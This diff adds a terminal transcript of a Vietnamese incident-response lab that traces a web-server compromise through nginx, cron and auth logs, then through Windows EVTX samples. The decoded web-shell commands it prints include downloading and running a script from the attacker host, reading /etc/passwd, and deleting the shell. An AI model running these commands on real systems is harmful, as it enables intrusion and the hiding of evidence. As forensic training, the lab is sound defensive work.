@@ -1,0 +1,72 @@
+$ cat lab14/DE-BAI.txt
+Sáng 22/11/2026 09:00, giám sát báo api02 dùng 100 % CPU từ đêm qua. Bạn có log của api02 (thư mục api02/var/log)
+và 3 tệp EVTX công khai (user-4720, admin-4732, apt-4720-4698) của hai máy Windows trong cùng 'công ty' (mẫu EVTX-ATTACK-SAMPLES / EVTX-to-MITRE-Attack).
+Trả lời 10 câu hỏi trong bài Lab 14. Mọi giờ trong báo cáo ghi theo UTC.
+$ cd lab14/api02/var/log && grep -E 'CRON\[[0-9]+\]: \((www-data)\)' syslog | sed -n '1p;$p'; grep -c 'kthreadd' syslog
+2026-11-21T22:36:01.028155+07:00 api02 CRON[420400]: (www-data) CMD (/var/tmp/.cache/kthreadd -c /var/tmp/.cache/c.json >/dev/null 2>&1)
+2026-11-22T09:00:01.015323+07:00 api02 CRON[514000]: (www-data) CMD (/var/tmp/.cache/kthreadd -c /var/tmp/.cache/c.json >/dev/null 2>&1)
+625
+$ cd lab14/api02/var/log && grep -E 'crontab\[' syslog
+2026-11-21T22:35:43.027720+07:00 api02 crontab[420352]: (www-data) REPLACE (www-data)
+$ cd lab14/api02/var/log && awk '$1 == "192.0.2.66" {print substr($4, 2, 17)}' nginx/access.log | uniq -c | awk '{print $2, $1}' | head -n 3; awk '$1 == "192.0.2.66"' nginx/access.log | wc -l
+21/Nov/2026:22:10 190
+21/Nov/2026:22:11 207
+21/Nov/2026:22:12 207
+1291
+$ cd lab14/api02/var/log && awk '$1 == "192.0.2.66" && $4 < "[21/Nov/2026:22:17" {print $9}' nginx/access.log | sort | uniq -c | sort -rn; awk '$1 == "192.0.2.66" && $9 != 404 && $4 < "[21/Nov/2026:22:17" {print $9, $7}' nginx/access.log
+   1235 404
+      3 403
+      1 302
+      1 301
+302 /admin
+403 /.git/HEAD
+403 /.env
+403 /server-status
+301 /uploads
+$ cd lab14/api02/var/log && grep -o '"Fuzz Faster U Fool[^"]*"' nginx/access.log | sort | uniq -c
+   1240 "Fuzz Faster U Fool v2.1.0-dev"
+$ cd lab14/api02/var/log && grep '"POST /admin/login' nginx/access.log | awk '{print $1, $9}' | sort | uniq -c
+      2 10.0.7.12 200
+      1 192.0.2.66 200
+     37 192.0.2.66 401
+$ cd lab14/api02/var/log && grep '192.0.2.66.*"POST /admin/login[^"]*" 200' nginx/access.log | cut -c1-80; grep -c '192.0.2.66.*"POST /admin/login[^"]*" 401' nginx/access.log
+192.0.2.66 - - [21/Nov/2026:22:26:47 +0700] "POST /admin/login HTTP/1.1" 200 220
+37
+$ cd lab14/api02/var/log && grep -E '192\.0\.2\.66.*"(GET|POST) /admin/media' nginx/access.log | cut -d'"' -f1,2 | cut -c15-; grep 'tai-len' nginx/error.log | cut -c1-120
+ [21/Nov/2026:22:30:42 +0700] "GET /admin/media/tai-len HTTP/1.1
+ [21/Nov/2026:22:31:25 +0700] "POST /admin/media/tai-len HTTP/1.1
+2026/11/21 22:31:25 [warn] 941#941: *88412 a client request body is buffered to a temporary file /var/cache/nginx/client
+$ cd lab14/api02/var/log && grep -oE '"GET /uploads/2026/11/logo-moi\.php\?cmd=[^ ]+ HTTP/1\.1" [0-9]+ [0-9]+' nginx/access.log | sed -E 's/"GET [^=]+=//; s/ HTTP\/1\.1"//' | python3 -c "import sys, urllib.parse as u; [print(u.unquote(l.rstrip())) for l in sys.stdin]"
+id 200 54
+uname -a 200 98
+cat /etc/passwd 200 1712
+sudo -n id 200 0
+cd /var/tmp && curl -so x.sh http://192.0.2.66/x.sh && sh x.sh 200 0
+crontab -l 200 77
+ps aux | grep kthreadd 200 143
+rm -f /var/tmp/x.sh 200 0
+rm -f logo-moi.php 200 0
+id 404 153
+$ cd lab14/api02/var/log && grep 'sudo' auth.log
+2026-11-21T22:34:50.011160+07:00 api02 sudo: www-data : a password is required ; PWD=/var/www/api/public/uploads/2026/11 ; USER=root ; COMMAND=/usr/bin/id
+$ cd lab14/api02/var/log && grep -c 'COMMAND=' auth.log; grep -c 'Accepted' auth.log; awk '/192\.0\.2\.66/ && /logo-moi/ {print substr($4, 2), $9}' nginx/access.log | tail -n 2
+1
+0
+21/Nov/2026:23:06:41 200
+21/Nov/2026:23:07:02 404
+$ cd lab14/api02/var/log && grep 'logo-moi' nginx/error.log | cut -c1-130
+2026/11/21 23:07:02 [error] 941#941: *90133 open() "/var/www/api/public/uploads/2026/11/logo-moi.php" failed (2: No such file or d
+$ evtx-rec tc/user-4720.evtx tc/admin-4732.evtx tc/apt-4720-4698.evtx | jq -r '[.t[0:19], .may, .id, (.data.TargetUserName // .data.TaskName), .data.SubjectUserName] | @tsv' | sort -u
+2020-07-12T05:12:58	jump01.offsec.lan	4720	hacking-local-acct	admmig
+2020-07-12T05:12:58	jump01.offsec.lan	4732	Users	admmig
+2020-07-12T05:14:30	jump01.offsec.lan	4732	Administrators	admmig
+2020-07-12T05:14:44	jump01.offsec.lan	4732	Backup Operators	admmig
+2021-06-01T14:06:34	fs01.offsec.lan	4720	WADGUtilityAccount	admmig
+2021-06-01T14:08:21	fs01.offsec.lan	4720	elie	admmig
+2021-06-01T14:09:38	fs01.offsec.lan	4698	\\Microsoft\\SynchronizeTimeZone	admmig
+$ evtx-rec tc/apt-4720-4698.evtx | jq -r 'select(.id == 4698) | .data.TaskContent' | grep -oE '<(Date|Author|Command|Hidden|StartBoundary)>[^<]*'
+<Date>2021-06-01T16:09:38.3707854
+<Author>OFFSEC\admmig
+<StartBoundary>2021-06-01T16:09:35.8747701
+<Hidden>false
+<Command>adf
